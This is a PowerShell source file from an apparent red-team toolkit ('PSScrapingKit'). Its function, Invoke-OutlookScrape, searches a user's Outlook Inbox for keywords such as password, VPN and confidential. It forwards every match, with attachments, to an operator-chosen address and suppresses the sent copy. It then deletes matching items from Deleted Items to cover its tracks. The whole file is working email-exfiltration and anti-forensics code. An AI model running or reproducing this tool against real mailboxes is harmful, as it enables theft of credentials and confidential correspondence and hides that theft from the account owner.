# LaresLLC PSScrapingKit 2023
# Neil Lines & Andy Gill
# v1.01 Release
function Invoke-OutlookScrape {
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $folders = $namespace.Folders
    $inboxFolderName = "Inbox"
    $sentItemsFolderName = "Sent Items"
    $deletedItemsFolderName = "Deleted Items"
    $inboxFolderIndex = $null
    $sentItemsFolderIndex = $null
    $deletedItemsFolderIndex = $null

    $folders | ForEach-Object {
        $folder = $_
        $subFolders = $folder.Folders
        $subFolders | ForEach-Object {
            $subFolder = $_
            if ($subFolder.Name -eq $inboxFolderName) {
                $inboxFolderIndex = $subFolder.EntryID
            }
            if ($subFolder.Name -eq $sentItemsFolderName) {
                $sentItemsFolderIndex = $subFolder.EntryID
            }
            if ($subFolder.Name -eq $deletedItemsFolderName) {
                $deletedItemsFolderIndex = $subFolder.EntryID
            }
        }
    }

    if ($inboxFolderIndex -and $sentItemsFolderIndex -and $deletedItemsFolderIndex) {
        $inbox = $namespace.GetFolderFromID($inboxFolderIndex)
        $sentItems = $namespace.GetFolderFromID($sentItemsFolderIndex)
        $deletedItems = $namespace.GetFolderFromID($deletedItemsFolderIndex)

        $validKeywordOptions = "1", "2"

        # Prompt for keyword selection
        $keywordOption = ""
        while ($keywordOption -notin $validKeywordOptions) {
            Write-Host "Select keyword option:"
            Write-Host "1. User-defined keywords"
            Write-Host "2. Default keywords (password, security, confidential, VPN, WIFI)"
            $keywordOption = Read-Host "Enter the keyword option"
        }

        $keywords = @()

        if ($keywordOption -eq "1") {
            # Prompt for user-defined keywords
            Write-Host "Enter keywords (one per line). Press Enter on an empty line to finish."
            while ($true) {
                $keywordInput = Read-Host "Enter a keyword"
                if ([string]::IsNullOrWhiteSpace($keywordInput)) {
                    break
                }
                $keywords += $keywordInput
            }
        }
        elseif ($keywordOption -eq "2") {
            # Default keywords
            $keywords = "password", "security", "confidential", "VPN", "WIFI"
        }

        # Prompt for destination email address
        $forwardToEmail = Read-Host "Enter the destination email address for forwarding"

        $items = $inbox.Items
        $items | ForEach-Object {
            $email = $_
            $foundKeywords = $keywords | Where-Object { $email.Subject -like "*$_*" -or $email.Body -like "*$_*" }
        
            if ($foundKeywords) {
                $subject = $email.Subject
                $sender = $email.SenderEmailAddress
                $recipients = $email.To | ForEach-Object { $_.Address }
                $body = $email.Body
            
                $forwardEmail = $outlook.CreateItem(0)
                $forwardEmail.Subject = "Matching Email Information: $subject"
                $forwardEmail.Body = "Sender: $sender`nRecipients: $recipients`n`n$body"
                $forwardEmail.To = $forwardToEmail
                $forwardEmail.DeleteAfterSubmit = $true
            
                $email.Attachments | ForEach-Object {
                    $attachment = $_
                    $tempPath = Join-Path -Path $env:TEMP -ChildPath $attachment.FileName
                    $attachment.SaveAsFile($tempPath)
                    $forwardEmail.Attachments.Add($tempPath)
                }
            
                $forwardEmail.Send()
            
                if ($forwardEmail.Attachments) {
                    $forwardEmail.Attachments | ForEach-Object { $_.Delete() }
                }
            
                Write-Host "Matching email found. Forwarded the email information to $forwardToEmail"
                Start-Sleep -Seconds 5
            
                $matchingItemsDeleted = $deletedItems.Items | Where-Object { $_.Subject -eq $subject }
                $matchingItemsDeleted | ForEach-Object { $_.Delete() }
                Write-Host "Matching emails permanently deleted from the Deleted Items folder"
            }
        }
    }
}

